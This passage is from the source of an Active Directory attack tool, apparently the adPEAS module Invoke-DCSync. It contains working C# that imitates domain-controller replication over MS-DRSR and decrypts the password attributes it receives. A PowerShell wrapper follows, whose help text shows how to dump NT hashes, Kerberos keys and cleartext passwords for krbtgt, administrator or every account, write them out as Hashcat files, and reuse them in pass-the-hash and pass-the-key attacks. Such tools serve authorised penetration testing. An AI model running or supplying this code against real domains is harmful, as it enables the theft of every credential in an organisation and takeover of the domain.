            if (formatOffered == 0)
            {
                if (Name.Contains("\\")) dcInfoReq.formatOffered = 2;       // DS_NT4_ACCOUNT_NAME
                else if (Name.Contains("=")) dcInfoReq.formatOffered = 1;   // DS_FQDN_1779_NAME
                else if (Name.Contains("@")) dcInfoReq.formatOffered = 8;   // DS_USER_PRINCIPAL_NAME
                else dcInfoReq.formatOffered = 0xfffffff9;                  // DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
            }
            else
                dcInfoReq.formatOffered = formatOffered;

            dcInfoReq.formatDesired = 6; // DS_UNIQUE_ID_NAME
            dcInfoReq.cNames = 1;
            IntPtr NameIntPtr = Marshal.StringToHGlobalUni(Name);
            GCHandle handle = GCHandle.Alloc(NameIntPtr, GCHandleType.Pinned);
            dcInfoReq.rpNames = handle.AddrOfPinnedObject();

            IntPtr dcInfoRep = IntPtr.Zero;
            uint dcOutVersion = 0;

            try
            {
                IntPtr result = NdrClientCall2_CrackName(GetStubPtr(4, 0), GetProcStringPtr(558), hDrs, 1, dcInfoReq, ref dcOutVersion, ref dcInfoRep);

                if (result == IntPtr.Zero)
                {
                    if (dcInfoRep != IntPtr.Zero)
                    {
                        DS_NAME_RESULTW dsNameResult = (DS_NAME_RESULTW)Marshal.PtrToStructure(dcInfoRep, typeof(DS_NAME_RESULTW));
                        if (dsNameResult.cItems >= 1)
                        {
                            DS_NAME_RESULT_ITEMW item = (DS_NAME_RESULT_ITEMW)Marshal.PtrToStructure(dsNameResult.rItems, typeof(DS_NAME_RESULT_ITEMW));
                            if (item.status == 0)
                            {
                                string guidString = Marshal.PtrToStringUni(item.pName);
                                userGuid = new Guid(guidString);
                                return 0;
                            }
                            return item.status; // Return actual DS_NAME_ERROR status
                        }
                    }
                    return 0xFFFF; // RPC succeeded but no result data
                }
                return (uint)result.ToInt64();
            }
            catch (System.Runtime.InteropServices.SEHException)
            {
                return (uint)Marshal.GetExceptionCode();
            }
            finally
            {
                handle.Free();
                Marshal.FreeHGlobal(NameIntPtr);
            }
        }
        #endregion

        #region Decryption
        static byte[] DecryptReplicationData(byte[] data)
        {
            if (data == null || data.Length < 16) return null;

            byte[] key;
            using (MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider())
            {
                md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
                md5.TransformFinalBlock(data, 0, 16);
                key = md5.Hash;
            }

            byte[] todecrypt = new byte[data.Length - 16];
            Array.Copy(data, 16, todecrypt, 0, data.Length - 16);
            CRYPTO_BUFFER todecryptBuffer = GetCryptoBuffer(todecrypt);
            CRYPTO_BUFFER keyBuffer = GetCryptoBuffer(key);
            RtlEncryptDecryptRC4(ref todecryptBuffer, ref keyBuffer);
            byte[] decrypted = new byte[todecryptBuffer.Length];
            Marshal.Copy(todecryptBuffer.Buffer, decrypted, 0, decrypted.Length);
            Marshal.FreeHGlobal(todecryptBuffer.Buffer);
            Marshal.FreeHGlobal(keyBuffer.Buffer);

            byte[] output = new byte[decrypted.Length - 4];
            Array.Copy(decrypted, 4, output, 0, decrypted.Length - 4);
            uint crc = CalcCrc32(output);
            uint expectedCrc = BitConverter.ToUInt32(decrypted, 0);
            if (crc != expectedCrc) return null;
            return output;
        }

        public static byte[] DecryptHashWithRID(byte[] hashEncryptedWithRID, byte[] sidByteForm)
        {
            if (hashEncryptedWithRID == null || sidByteForm == null || hashEncryptedWithRID.Length < 16)
                return null;

            GCHandle handle = GCHandle.Alloc(sidByteForm, GCHandleType.Pinned);
            IntPtr sidIntPtr = handle.AddrOfPinnedObject();
            IntPtr SubAuthorityCountIntPtr = GetSidSubAuthorityCount(sidIntPtr);
            byte SubAuthorityCount = Marshal.ReadByte(SubAuthorityCountIntPtr);
            IntPtr SubAuthorityIntPtr = GetSidSubAuthority(sidIntPtr, (uint)SubAuthorityCount - 1);
            uint rid = (uint)Marshal.ReadInt32(SubAuthorityIntPtr);
            handle.Free();

            byte[] output = new byte[16];
            IntPtr outputPtr = Marshal.AllocHGlobal(16);
            RtlDecryptDES2blocks1DWORD(hashEncryptedWithRID, ref rid, outputPtr);
            Marshal.Copy(outputPtr, output, 0, 16);
            Marshal.FreeHGlobal(outputPtr);
            return output;
        }
        #endregion

        #region Marshal Replication Data
        static List<Dictionary<int, object>> MarshalReplicationData(DRS_MSG_GETCHGREPLY_V6 pmsgOut)
        {
            List<Dictionary<int, object>> allData = new List<Dictionary<int, object>>();
            IntPtr pObjects = pmsgOut.pObjects;
            uint numObjects = pmsgOut.cNumObjects;

            if (pObjects == IntPtr.Zero || numObjects == 0) return allData;

            REPLENTINFLIST list = (REPLENTINFLIST)Marshal.PtrToStructure(pObjects, typeof(REPLENTINFLIST));

            while (numObjects > 0)
            {
                Dictionary<int, object> replicationData = new Dictionary<int, object>();
                int size = Marshal.SizeOf(typeof(ATTR));

                for (uint i = 0; i < list.Entinf.AttrBlock.attrCount; i++)
                {
                    ATTR attr = (ATTR)Marshal.PtrToStructure(IntPtr.Add(list.Entinf.AttrBlock.pAttr, (int)(i * size)), typeof(ATTR));
                    int sizeval = Marshal.SizeOf(typeof(ATTRVAL));
                    List<byte[]> values = new List<byte[]>();

                    for (uint j = 0; j < attr.AttrVal.valCount; j++)
                    {
                        ATTRVAL attrval = (ATTRVAL)Marshal.PtrToStructure(IntPtr.Add(attr.AttrVal.pAVal, (int)(j * sizeval)), typeof(ATTRVAL));
                        byte[] data = new byte[attrval.valLen];
                        Marshal.Copy(attrval.pVal, data, 0, (int)attrval.valLen);

                        switch ((ATT)attr.attrTyp)
                        {
                            case ATT.ATT_UNICODE_PWD:
                            case ATT.ATT_NT_PWD_HISTORY:
                            case ATT.ATT_DBCS_PWD:
                            case ATT.ATT_LM_PWD_HISTORY:
                            case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
                                data = DecryptReplicationData(data);
                                break;
                        }
                        values.Add(data);
                    }

                    if (values.Count == 1)
                        replicationData[(int)attr.attrTyp] = values[0];
                    else if (values.Count > 1)
                        replicationData[(int)attr.attrTyp] = values;
                }

                allData.Add(replicationData);

                if (list.pNextEntInf != IntPtr.Zero)
                    list = (REPLENTINFLIST)Marshal.PtrToStructure(list.pNextEntInf, typeof(REPLENTINFLIST));
                numObjects--;
            }
            return allData;
        }
        #endregion

        #region Public API
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        public static DCSyncResult GetReplicationData(string dc, string domain, string user, string guid, string authuser, string authdomain, string authpassword, bool forcentlm, bool allUsers, string altservice)
        {
            DCSyncResult result = new DCSyncResult();
            List<DCSyncUserData> userDataList = new List<DCSyncUserData>();

            SessionKey = null;

            IntPtr hBinding = IntPtr.Zero;  // Declare outside try so it's available in finally

            try
            {
                if (!Asn1_init())
                {
                    result.Error = "Failed to initialize ASN1 module";
                    return result;
                }

                int rpcAuth = forcentlm ? RPC_C_AUTHN_WINNT : RPC_C_AUTHN_GSS_NEGOTIATE;
                if (string.IsNullOrEmpty(altservice)) altservice = "ldap";

                hBinding = CreateBinding(dc, altservice, rpcAuth, authuser, authdomain, authpassword, forcentlm);
                if (hBinding == IntPtr.Zero)
                {
                    result.Error = "Failed to create RPC binding to " + dc;
                    Asn1_term();
                    return result;
                }

                DRS_EXTENSIONS_INT DrsExtensionsInt = new DRS_EXTENSIONS_INT();
                DrsExtensionsInt.cb = (uint)(Marshal.SizeOf(typeof(DRS_EXTENSIONS_INT)) - Marshal.SizeOf(typeof(uint)));
                DrsExtensionsInt.dwFlags = ALL_EXT;
                DrsExtensionsInt.dwFlagsExt = DRS_EXT_LH_BETA2 | DRS_EXT_RECYCLE_BIN | DRS_EXT_PAM;
                DrsExtensionsInt.dwExtCaps = DRS_EXT_LH_BETA2 | DRS_EXT_RECYCLE_BIN | DRS_EXT_PAM;

                DRS_EXTENSIONS_INT extensions;
                IntPtr hDrs;
                Guid DomainGUID;
                Guid UserGuid;

                // Initial DRS bind with well-known GUID
                int bindResult = DrsrGetDCBind(hBinding, new Guid("e24d201a-4fd6-11d1-a3da-0000f875ae0d"), DrsExtensionsInt, out extensions, out hDrs);
                if (bindResult != 0)
                {
                    result.Error = "DRSBind failed (initial): error " + bindResult;
                    RpcBindingFree(ref hBinding);
                    Asn1_term();
                    return result;
                }

                // Get DC info
                int dcInfoResult = DrsDomainControllerInfo(hDrs, domain, dc, out DomainGUID);
                if (dcInfoResult != 0)
                {
                    result.Error = "DrsDomainControllerInfo failed: error " + dcInfoResult;
                    RpcBindingFree(ref hBinding);
                    Asn1_term();
                    return result;
                }

                // Resolve user to GUID
                if (!string.IsNullOrEmpty(guid))
                {
                    UserGuid = new Guid(guid);
                }
                else if (!string.IsNullOrEmpty(user))
                {
                    uint crackResult = DrsrCrackName(hDrs, user, out UserGuid);
                    if (crackResult != 0)
                    {
                        // Fallback: try DOMAIN\user format (DS_NT4_ACCOUNT_NAME = 2)
                        string domainNetbios = domain.Split('.')[0].ToUpper();
                        string nt4Name = domainNetbios + "\\" + user;
                        crackResult = DrsrCrackName(hDrs, nt4Name, out UserGuid, 2);
                    }
                    if (crackResult != 0)
                    {
                        // Fallback: try user@domain format (DS_USER_PRINCIPAL_NAME = 8)
                        string upnName = user + "@" + domain;
                        crackResult = DrsrCrackName(hDrs, upnName, out UserGuid, 8);
                    }
                    if (crackResult != 0)
                    {
                        string errorMsg;
                        if (crackResult == 1)
                            errorMsg = "User '" + user + "' could not be resolved (DS_NAME_ERROR_RESOLVING). The name is being processed but not yet available.";
                        else if (crackResult == 2)
                            errorMsg = "User '" + user + "' not found in domain '" + domain + "' (DS_NAME_ERROR_NOT_FOUND). Check sAMAccountName spelling.";
                        else if (crackResult == 3)
                            errorMsg = "User '" + user + "' is ambiguous (DS_NAME_ERROR_NOT_UNIQUE). Multiple objects match this name.";
                        else if (crackResult == 4)
                            errorMsg = "User '" + user + "' cannot be mapped (DS_NAME_ERROR_NO_MAPPING). The name format is not recognized.";
                        else if (crackResult == 5)
                            errorMsg = "User '" + user + "' exists in domain only (DS_NAME_ERROR_DOMAIN_ONLY). Cannot resolve to a specific object.";
                        else
                            errorMsg = "DRSCrackNames failed for '" + user + "': unknown status " + crackResult;

                        result.Error = errorMsg;
                        RpcBindingFree(ref hBinding);
                        Asn1_term();
                        return result;
                    }
                }
                else
                {
                    result.Error = "No user or GUID specified";
                    RpcBindingFree(ref hBinding);
                    Asn1_term();
                    return result;
                }

                // Re-bind with actual DC GUID
                bindResult = DrsrGetDCBind(hBinding, DomainGUID, DrsExtensionsInt, out extensions, out hDrs);
                if (bindResult != 0)
                {
                    result.Error = "DRSBind failed (DC GUID): error " + bindResult;
                    RpcBindingFree(ref hBinding);
                    Asn1_term();
                    return result;
                }

                // Build request
                DRS_MSG_GETCHGREQ_V8 mSG_GETCHGREQ = new DRS_MSG_GETCHGREQ_V8();
                mSG_GETCHGREQ.uuidDsaObjDest = DomainGUID;

                DSNAME dsname = new DSNAME();
                dsname.Guid = UserGuid;
                IntPtr pdsName = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(DSNAME)));
                Marshal.StructureToPtr(dsname, pdsName, true);
                mSG_GETCHGREQ.pNC = pdsName;
                mSG_GETCHGREQ.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
                mSG_GETCHGREQ.cMaxObjects = (uint)(allUsers ? 1000 : 1);
                mSG_GETCHGREQ.cMaxBytes = 0x00a00000;
                mSG_GETCHGREQ.ulExtendedOp = (uint)(allUsers ? 0 : 6);

                // Build partial attr set
                PARTIAL_ATTR_VECTOR_V1_EXT partAttSet = new PARTIAL_ATTR_VECTOR_V1_EXT();
                mSG_GETCHGREQ.PrefixTableDest = new SCHEMA_PREFIX_TABLE();
                partAttSet.dwVersion = 1;
                partAttSet.dwReserved1 = 0;
                partAttSet.cAttrs = (uint)oids.Length;
                partAttSet.rgPartialAttr = new uint[oids.Length];

                for (int i = 0; i < oids.Length; i++)
                    DrsrMakeAttid(ref mSG_GETCHGREQ.PrefixTableDest, oids[i], ref partAttSet.rgPartialAttr[i]);

                mSG_GETCHGREQ.pPartialAttrSet = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PARTIAL_ATTR_VECTOR_V1_EXT)));
                Marshal.StructureToPtr(partAttSet, mSG_GETCHGREQ.pPartialAttrSet, false);

                // Execute replication
                // Safety limit to prevent infinite loops
                const int MAX_REPLICATION_ITERATIONS = 10000;
                int iterationCount = 0;

                do
                {
                    iterationCount++;

                    // Timeout protection
                    if (iterationCount > MAX_REPLICATION_ITERATIONS)
                    {
                        result.Error = "DCSync exceeded maximum iterations (" + MAX_REPLICATION_ITERATIONS + "). Possible infinite loop or DC issue.";
                        break;
                    }

                    DRS_MSG_GETCHGREPLY_V6 mSG_GETCHGREPLY = new DRS_MSG_GETCHGREPLY_V6();
                    uint dwOutVersion = 0;
                    IntPtr rpcResult = NdrClientCall2_GetNCChanges(GetStubPtr(4, 0), GetProcStringPtr(134), hDrs, 8, mSG_GETCHGREQ, ref dwOutVersion, ref mSG_GETCHGREPLY);

                    if ((int)rpcResult.ToInt64() != 0)
                    {
                        result.Error = "GetNCChanges RPC call failed: error " + (int)rpcResult.ToInt64();
                        break;
                    }

                    // Check DRSUAPI-specific error code
                    if (mSG_GETCHGREPLY.dwDRSError != 0)
                    {
                        string drsuapiError;
                        if (mSG_GETCHGREPLY.dwDRSError == 8439)
                            drsuapiError = "ERROR_DS_DRA_ACCESS_DENIED - Insufficient replication privileges";
                        else if (mSG_GETCHGREPLY.dwDRSError == 8593)
                            drsuapiError = "ERROR_DS_DRA_BAD_NC - Invalid naming context";
                        else if (mSG_GETCHGREPLY.dwDRSError == 8440)
                            drsuapiError = "ERROR_DS_DRA_BAD_DN - Invalid distinguished name";
                        else if (mSG_GETCHGREPLY.dwDRSError == 8477)
                            drsuapiError = "ERROR_DS_DRA_SHUTDOWN - DC is shutting down";
                        else
                            drsuapiError = "DRSUAPI error code: " + mSG_GETCHGREPLY.dwDRSError;

                        result.Error = drsuapiError;
                        break;
                    }

                    // Validate response has data
                    if (mSG_GETCHGREPLY.pObjects == IntPtr.Zero && mSG_GETCHGREPLY.cNumObjects == 0)
                    {
                        // No objects returned - could be end of replication or error
                        if (!allUsers)
                        {
                            result.Error = "No replication data returned for target object";
                            break;
                        }
                        // For allUsers, empty response just means we're done
                        break;
                    }

                    List<Dictionary<int, object>> replData = MarshalReplicationData(mSG_GETCHGREPLY);

                    foreach (var replicationData in replData)
                    {
                        DCSyncUserData userData = new DCSyncUserData();

                        if (replicationData.ContainsKey((int)ATT.ATT_SAM_ACCOUNT_NAME))
                            userData.SAMAccountName = Encoding.Unicode.GetString((byte[])replicationData[(int)ATT.ATT_SAM_ACCOUNT_NAME]);
                        if (replicationData.ContainsKey((int)ATT.ATT_USER_PRINCIPAL_NAME))
                            userData.UserPrincipalName = Encoding.Unicode.GetString((byte[])replicationData[(int)ATT.ATT_USER_PRINCIPAL_NAME]);
                        if (replicationData.ContainsKey((int)ATT.ATT_RDN))
                            userData.DisplayName = Encoding.Unicode.GetString((byte[])replicationData[(int)ATT.ATT_RDN]);
                        if (replicationData.ContainsKey((int)ATT.ATT_OBJECT_SID))
                            userData.ObjectSID = (byte[])replicationData[(int)ATT.ATT_OBJECT_SID];
                        if (replicationData.ContainsKey((int)ATT.ATT_USER_ACCOUNT_CONTROL))
                            userData.UserAccountControl = BitConverter.ToInt32((byte[])replicationData[(int)ATT.ATT_USER_ACCOUNT_CONTROL], 0);
                        if (replicationData.ContainsKey((int)ATT.ATT_SAM_ACCOUNT_TYPE))
                            userData.SAMAccountType = BitConverter.ToInt32((byte[])replicationData[(int)ATT.ATT_SAM_ACCOUNT_TYPE], 0);
                        if (replicationData.ContainsKey((int)ATT.ATT_PWD_LAST_SET))
                            userData.PwdLastSet = BitConverter.ToInt64((byte[])replicationData[(int)ATT.ATT_PWD_LAST_SET], 0);
                        if (replicationData.ContainsKey((int)ATT.ATT_ACCOUNT_EXPIRES))
                            userData.AccountExpires = BitConverter.ToInt64((byte[])replicationData[(int)ATT.ATT_ACCOUNT_EXPIRES], 0);
                        if (replicationData.ContainsKey((int)ATT.ATT_UNICODE_PWD))
                            userData.UnicodePassword = (byte[])replicationData[(int)ATT.ATT_UNICODE_PWD];
                        if (replicationData.ContainsKey((int)ATT.ATT_NT_PWD_HISTORY))
                            userData.NTPasswordHistory = (byte[])replicationData[(int)ATT.ATT_NT_PWD_HISTORY];
                        if (replicationData.ContainsKey((int)ATT.ATT_DBCS_PWD))
                            userData.LMPassword = (byte[])replicationData[(int)ATT.ATT_DBCS_PWD];
                        if (replicationData.ContainsKey((int)ATT.ATT_LM_PWD_HISTORY))
                            userData.LMPasswordHistory = (byte[])replicationData[(int)ATT.ATT_LM_PWD_HISTORY];
                        if (replicationData.ContainsKey((int)ATT.ATT_SUPPLEMENTAL_CREDENTIALS))
                            userData.SupplementalCredentials = (byte[])replicationData[(int)ATT.ATT_SUPPLEMENTAL_CREDENTIALS];
                        if (replicationData.ContainsKey((int)ATT.ATT_SID_HISTORY))
                            userData.SIDHistory = (byte[])replicationData[(int)ATT.ATT_SID_HISTORY];

                        userDataList.Add(userData);
                    }

                    if (allUsers && Convert.ToBoolean(mSG_GETCHGREPLY.fMoreData))
                    {
                        mSG_GETCHGREQ.uuidInvocIdSrc = mSG_GETCHGREPLY.uuidInvocIdSrc;
                        mSG_GETCHGREQ.usnvecFrom = mSG_GETCHGREPLY.usnvecTo;
                    }
                    else
                    {
                        break;
                    }
                } while (true);

                RpcBindingFree(ref hBinding);
                Asn1_term();

                result.Success = userDataList.Count > 0;
                result.Users = userDataList.ToArray();
                if (!result.Success && string.IsNullOrEmpty(result.Error))
                    result.Error = "No replication data returned";
            }
            catch (Exception ex)
            {
                result.Error = ex.GetType().Name + ": " + ex.Message;
            }
            finally
            {
                // Always cleanup resources, even on exception
                if (hBinding != IntPtr.Zero)
                {
                    try { RpcBindingFree(ref hBinding); } catch { }
                }
                Asn1_term();
            }

            return result;
        }
        #endregion
    }
}
'@

# ============================================================================
# PowerShell Wrapper Function
# ============================================================================

function Invoke-DCSync {
<#
.SYNOPSIS
    Replicates Active Directory objects using the DRSUAPI protocol to extract credential material.

.DESCRIPTION
    Invoke-DCSync uses the MS-DRSR (Directory Replication Service Remote) RPC protocol to replicate Active Directory objects,
    extracting NT hashes, Kerberos keys (AES256, AES128, DES), cleartext passwords (if reversible encryption is enabled), and WDigest hashes.

    This is the same replication mechanism that Domain Controllers use for normal AD replication.
    Requires the following extended rights on the target domain:
    - DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
    - DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

.PARAMETER Identity
    Target user to replicate. Can be:
    - sAMAccountName (e.g., "administrator", "krbtgt")
    - Distinguished Name (e.g., "CN=krbtgt,CN=Users,DC=contoso,DC=com")
    - SID (e.g., "S-1-5-21-...")
    - objectGUID (e.g., "a4b2c1d3-...")

    Default: "krbtgt" (the domain's Kerberos service account)

.PARAMETER Domain
    Target domain FQDN (e.g., "contoso.com").
    If not specified, auto-detected from the current adPEAS session (see Connect-adPEAS).

.PARAMETER Server
    Specific Domain Controller to query (hostname or IP).
    If not specified, uses the following priority:
    1. Current adPEAS session DC (if Connect-adPEAS was used)
    2. Auto-discovery via Resolve-adPEASName (SRV records + reachability test)

.PARAMETER Credential
    PSCredential object for authentication.
    If not specified, uses the current Windows session credentials (SSPI/Negotiate).
    For session-based authentication, use Connect-adPEAS first.

.PARAMETER JustNTHash
    Only output NT hash (returns object with SAMAccountName and NTHash).
    Mutually exclusive with -JustAES, -JustLM, and -JustCleartext.

.PARAMETER JustAES
    Only output AES256 and AES128 keys (returns object with SAMAccountName, AES256Key, AES128Key).
    Mutually exclusive with -JustNTHash, -JustLM, and -JustCleartext.

.PARAMETER JustLM
    Only output LM hash (returns object with SAMAccountName, LMHash).
    Note: LM hashes are rarely used in modern environments.
    Mutually exclusive with -JustNTHash, -JustAES, and -JustCleartext.

.PARAMETER JustCleartext
    Only output cleartext password if available (returns object with SAMAccountName, CleartextPassword).
    Note: Only works if reversible encryption is enabled for the account.
    Mutually exclusive with -JustNTHash, -JustAES, and -JustLM.

.PARAMETER IncludeHistory
    Include password history hashes in the output.
    With -JustNTHash: Adds NTHashHistory property (if present).
    With -JustLM: Adds LMHashHistory property (if present).
    Without output filters: Adds both NTHashHistory and LMHashHistory properties (if present).
    By default, history hashes are excluded to reduce output size.

.PARAMETER AllAccounts
    Replicate all accounts in the domain (both users and computers).
    Mutually exclusive with -UsersOnly and -ComputersOnly.
    Can be combined with -EnabledOnly to filter for enabled accounts only.

.PARAMETER UsersOnly
    Only replicate user accounts (excludes computer accounts).
    Mutually exclusive with -AllAccounts and -ComputersOnly.
    Can be combined with -EnabledOnly to filter for enabled users only.

.PARAMETER ComputersOnly
    Only replicate computer accounts (excludes user accounts).
    Mutually exclusive with -AllAccounts and -UsersOnly.
    Can be combined with -EnabledOnly to filter for enabled computers only.

.PARAMETER EnabledOnly
    Only replicate enabled accounts (excludes disabled accounts).
    Can be combined with -AllAccounts, -UsersOnly, or -ComputersOnly.

.PARAMETER OutputFile
    Export credential material in username:hash format to the specified file.
    Exports whatever is currently being queried:
    - Normal mode or -JustNTHash: username:nthash (Hashcat mode 1000)
    - -JustAES: username:aes256key and username:aes128key (Hashcat mode 18200 for Kerberos 5 TGS-REP AES256)
    - -JustLM: username:lmhash (Hashcat mode 3000)
    - -JustCleartext: username:cleartext

    If combined with -IncludeHistory, also exports history as username_history1:hash, username_history2:hash, etc.
    File is overwritten if it exists.

.EXAMPLE
    Invoke-DCSync -Identity "krbtgt" -Domain "contoso.com" -Server "dc01.contoso.com"

    Replicates the krbtgt account from dc01.contoso.com and extracts all credential material.

.EXAMPLE
    Invoke-DCSync -Identity "administrator" -Domain "contoso.com" -Server "dc01.contoso.com" -Credential (Get-Credential)

    Replicates the administrator account using explicit credentials.

.EXAMPLE
    Invoke-DCSync -Identity "krbtgt" -Domain "contoso.com" -Server "dc01.contoso.com" -JustNTHash

    Outputs only the NT hash object:
    SAMAccountName : krbtgt
    NTHash         : 1981d81c419652727d3d0c060ab0e76c

.EXAMPLE
    Invoke-DCSync -Identity "S-1-5-21-2825286099-527498140-4021532933-502" -Domain "contoso.com" -Server "dc01.contoso.com"

    Replicates a user by SID (useful when sAMAccountName is unknown).

.EXAMPLE
    $result = Invoke-DCSync -Identity "krbtgt" -Domain "contoso.com" -Server "dc01.contoso.com" -JustNTHash
    Invoke-KerberosAuth -UserName "krbtgt" -Domain "contoso.com" -NTHash $result.NTHash

    Extract krbtgt NT hash and use it for Overpass-the-Hash attack.

.EXAMPLE
    Invoke-DCSync -Identity "administrator" -JustAES

    Outputs only AES keys for the administrator account (useful for Pass-the-Key attacks).

.EXAMPLE
    Invoke-DCSync -Identity "user01" -IncludeHistory

    Extracts current and historical password hashes (useful for password reuse analysis).

.EXAMPLE
    Invoke-DCSync -Identity "svc_backup" -JustCleartext

    Outputs only cleartext password if reversible encryption is enabled for the account.

.EXAMPLE
    Invoke-DCSync -AllAccounts -UsersOnly -JustLM | Where-Object { $_.LMHash }

    Finds all users with LM hashes (insecure legacy hashes).

.EXAMPLE
    Invoke-DCSync -AllAccounts -UsersOnly -EnabledOnly -Domain "contoso.com"

    Replicates all enabled user accounts (excludes computers and disabled accounts).

.EXAMPLE
    Invoke-DCSync -AllAccounts -ComputersOnly -Domain "contoso.com" | Where-Object { $_.SAMAccountName -like "DC*" }

    Replicates all computer accounts and filters for Domain Controllers.

.EXAMPLE
    Invoke-DCSync -AllAccounts -UsersOnly -EnabledOnly -Domain "contoso.com" -OutputFile "hashes.txt"

    Replicates all enabled users and exports NT hashes in Hashcat format (username:hash) to hashes.txt.
    File contents example:
    Administrator:9ec9d30b8b69ecbbada1d3110f354f8d
    krbtgt:1981d81c419652727d3d0c060ab0e76c
    user01:32ed87bdb5fdc5e9cba88547376818d4

.EXAMPLE
    Invoke-DCSync -AllAccounts -UsersOnly -IncludeHistory -OutputFile "hashes_with_history.txt"

    Exports current NT hashes plus history hashes:
    Administrator:9ec9d30b8b69ecbbada1d3110f354f8d
    Administrator_history1:a1b2c3d4e5f6...
    Administrator_history2:f6e5d4c3b2a1...
    krbtgt:1981d81c419652727d3d0c060ab0e76c

.OUTPUTS
    PSCustomObject with the following properties (depending on output mode):

    Normal mode (no -Just* parameter):
    - PSTypeName: 'adPEAS.DCSync.Result'
    - Success: Boolean indicating if replication succeeded
    - Domain: Target domain FQDN
    - DomainController: Target DC hostname
    - SAMAccountName: User's sAMAccountName
    - UserPrincipalName: User's UPN
    - DisplayName: User's display name
    - ObjectSID: User's SID string
    - RID: User's Relative Identifier (last part of SID)
    - UserAccountControl: UAC flags
    - SAMAccountType: Account type
    - PwdLastSet: DateTime when password was last changed
    - AccountExpires: DateTime when account expires (null if never)
    - NTHash: NT hash (32 hex chars)
    - LMHash: LM hash (32 hex chars, null if not present)
    - NTHashHistory: Array of previous NT hashes (only with -IncludeHistory, only if present)
    - LMHashHistory: Array of previous LM hashes (only with -IncludeHistory, only if present)
    - AES256Key: AES256-CTS-HMAC-SHA1-96 key (64 hex chars)
    - AES128Key: AES128-CTS-HMAC-SHA1-96 key (32 hex chars)
    - DESKey: DES-CBC-MD5 key (16 hex chars)
    - KerberosSalt: Kerberos salt string
    - CleartextPassword: Cleartext password (null if not available)
    - WDigestHashes: Array of 29 WDigest hashes
    - SupplementalCredentials: Raw supplementalCredentials bytes
    - Message: Success/error message
    - Error: Error details (null on success)

    -JustNTHash mode:
    - SAMAccountName: User's sAMAccountName
    - NTHash: NT hash (32 hex chars)
    - NTHashHistory: Array of previous NT hashes (only with -IncludeHistory, only if present)

    -JustAES mode:
    - SAMAccountName: User's sAMAccountName
    - AES256Key: AES256-CTS-HMAC-SHA1-96 key (64 hex chars)
    - AES128Key: AES128-CTS-HMAC-SHA1-96 key (32 hex chars)

    -JustLM mode:
    - SAMAccountName: User's sAMAccountName
    - LMHash: LM hash (32 hex chars, null if not present)
    - LMHashHistory: Array of previous LM hashes (only with -IncludeHistory, only if present)

    -JustCleartext mode:
    - SAMAccountName: User's sAMAccountName
    - CleartextPassword: Cleartext password (null if not available)

.NOTES
    Author: Alexander Sturz (@_61106960_)
    Based on: SharpKatz (BSD 3-Clause, @b4rtik) and MakeMeEnterpriseAdmin (vincent.letoux@mysmartlogon.com)
#>
    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [string]$Identity = "krbtgt",

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [switch]$JustNTHash,

        [Parameter(Mandatory=$false)]
        [switch]$JustAES,

        [Parameter(Mandatory=$false)]
        [switch]$JustLM,

        [Parameter(Mandatory=$false)]
        [switch]$JustCleartext,

        [Parameter(Mandatory=$false)]
        [switch]$IncludeHistory,

        [Parameter(Mandatory=$false)]
        [switch]$AllAccounts,

        [Parameter(Mandatory=$false)]
        [switch]$UsersOnly,

        [Parameter(Mandatory=$false)]
        [switch]$ComputersOnly,

        [Parameter(Mandatory=$false)]
        [switch]$EnabledOnly,

        [Parameter(Mandatory=$false)]
        [string]$OutputFile
    )

    begin {
        Write-Log "[Invoke-DCSync] Starting DCSync replication"
    }

    process {
        # Validate mutually exclusive output format parameters
        $outputFormats = @($JustNTHash, $JustAES, $JustLM, $JustCleartext)
        $selectedFormats = ($outputFormats | Where-Object { $_ }).Count
        if ($selectedFormats -gt 1) {
            Show-Line "DCSync failed: Only one output format can be specified at a time" -Class Finding
            Show-Line "Choose one: -JustNTHash, -JustAES, -JustLM, or -JustCleartext" -Class Note
            return [PSCustomObject]@{
                PSTypeName = 'adPEAS.DCSync.Result'
                Success    = $false
                Error      = "Multiple output formats specified (mutually exclusive)"
            }
        }

        # Validate mutually exclusive account type parameters
        $accountTypes = @($AllAccounts, $UsersOnly, $ComputersOnly)
        $selectedTypes = ($accountTypes | Where-Object { $_ }).Count
        if ($selectedTypes -gt 1) {
            Show-Line "DCSync failed: Only one account type can be specified at a time" -Class Finding
            Show-Line "Choose one: -AllAccounts, -UsersOnly, or -ComputersOnly" -Class Note
            return [PSCustomObject]@{
                PSTypeName = 'adPEAS.DCSync.Result'
                Success    = $false
                Error      = "Multiple account types specified (mutually exclusive)"
            }
        }

        # Load C# interop if not already loaded
        if (-not ([System.Management.Automation.PSTypeName]'adPEAS.DCSyncInterop').Type) {
            try {
                Add-Type -TypeDefinition $Script:DCSyncCode -Language CSharp -ErrorAction Stop
                Write-Log "[Invoke-DCSync] C# interop compiled successfully"
            }
            catch {
                if ($_.Exception.Message -notmatch 'already exists') {
                    Show-Line "DCSync failed: Could not compile C# interop code" -Class Finding
                    return [PSCustomObject]@{
                        PSTypeName = 'adPEAS.DCSync.Result'
                        Success    = $false
                        Error      = "Failed to compile DCSync interop code: $($_.Exception.Message)"
                    }
                }
            }
        }

        # Auto-detect Domain from session if not specified
        if (-not $Domain) {
            if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                $Domain = $Script:LDAPContext['Domain']
                Write-Log "[Invoke-DCSync] Using session domain: $Domain"
            }
            else {
                Show-Line "DCSync failed: No domain specified and no active adPEAS session found." -Class Finding
                Show-Line "Please specify -Domain parameter or run Connect-adPEAS first." -Class Note
                return [PSCustomObject]@{
                    PSTypeName = 'adPEAS.DCSync.Result'
                    Success    = $false
